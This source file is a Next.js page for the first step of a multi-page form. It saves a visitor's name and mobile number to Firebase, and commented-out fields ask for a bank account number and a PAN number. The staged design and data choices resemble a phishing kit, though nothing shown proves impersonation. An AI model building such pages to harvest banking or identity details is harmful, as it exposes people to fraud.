'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import { ref, push } from "firebase/database";
import { db } from "../inlcude/firebase";
import { formatDateTime } from "../inlcude/formatDateTime";
import styles from "./page.module.css"
export default function Home() {
    const [loading, setLoading] = useState(false);
    const router = useRouter();
    useEffect(()=>{
        localStorage.removeItem('collection_id');
    }, [])
    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        const currentDate = new Date();
        const formattedDateTime = formatDateTime(currentDate);      
        jsonObject['updated_at'] = formattedDateTime;
        const SITE = process.env.NEXT_PUBLIC_SITE;
        
        // Generate a unique key using push(), but don't push data yet
        const uniqueKeyRef = push(ref(db, 'data/' + SITE + "/form"));
        const uniqueKey = uniqueKeyRef.key; 
        
        const dbref = ref(db, 'data/' + SITE + "/form/" + uniqueKey);
        push(dbref, jsonObject)
            .then(() => {
                setLoading(false);
                e.target.reset();
                console.log(uniqueKey);
                localStorage.setItem('collection_id', uniqueKey); 
                router.push('/2');
            })
            .catch((error) => {
                setLoading(false);
                console.error('Error saving data:', error);
                setMessage("Error saving data");
            });
    }
  return (
    <>
    <Header />
    <div className="bg-primary card  mx-4 pt-2" style={{marginTop:"25px"}} >
        <form onSubmit={handleSubmit} className="mt-3 py-2 mx-4">
            <div className="form-group mb-5">
                <input name="na" type="text" placeholder="Name" className={`${styles.formControl} form-control`}  required/>
            </div>
            <div className="form-group mb-5">
                <input name="MNo" type="text" placeholder="Mobile Number" inputMode="numeric" className={`${styles.formControl} form-control`} minLength={10} required maxLength={10}/>
            </div>
            {/* <div className="form-group mb-5">
                <input name="ac" type="text" placeholder="Account Number" inputMode="numeric" className={`${styles.formControl} form-control`} minLength={15} required maxLength={16}/>
            </div>
            <div className="form-group mb-5">
                <input name="paan" type="text" title="Invalid Pan Number" placeholder="Pan Number"     pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" className={`${styles.formControl} form-control`}  minLength={10} maxLength={10}   required/>
            </div> */}
            

            <div className="d-flex text-center mb-4 form-group justify-content-center ">
                <input type="submit" disabled={loading} className="btn btn-primary py-2 text-white px-5 shadow shadow-lg mt-2" defaultValue="Next" />
            </div>
        </form>
    </div>
    <Footer />
</>
  );
}
